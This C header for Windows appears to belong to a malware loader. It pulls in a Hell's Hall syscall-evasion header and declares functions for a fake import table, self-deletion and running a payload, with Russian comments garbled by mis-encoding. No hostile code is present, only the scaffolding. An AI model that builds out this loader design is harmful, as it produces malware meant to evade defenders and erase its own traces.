#pragma once

#include <Windows.h>
#include <stdio.h>
#include <Winternl.h>  // ƒл€ функций NtDll и структур
#include <HellsHall.h>

#define PRINTA( STR, ... )                                                                  \
    if (1) {                                                                                \
        LPSTR buf = (LPSTR)HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 );           \
        if ( buf != NULL ) {                                                                \
            int len = wsprintfA( buf, STR, __VA_ARGS__ );                                   \
            WriteConsoleA( GetStdHandle( STD_OUTPUT_HANDLE ), buf, len, NULL, NULL );       \
            HeapFree( GetProcessHeap(), 0, buf );                                           \
        }                                                                                   \
    }

// ќбъ€вление _fltused дл€ поддержки плавающей точки без CRT
#ifdef _MSC_VER
__declspec(selectany) int _fltused = 0;
#endif

DWORD FakeIat();
uint32_t GetInitKey();
BOOL NtDeleteSelf();
BOOL RunPayload();
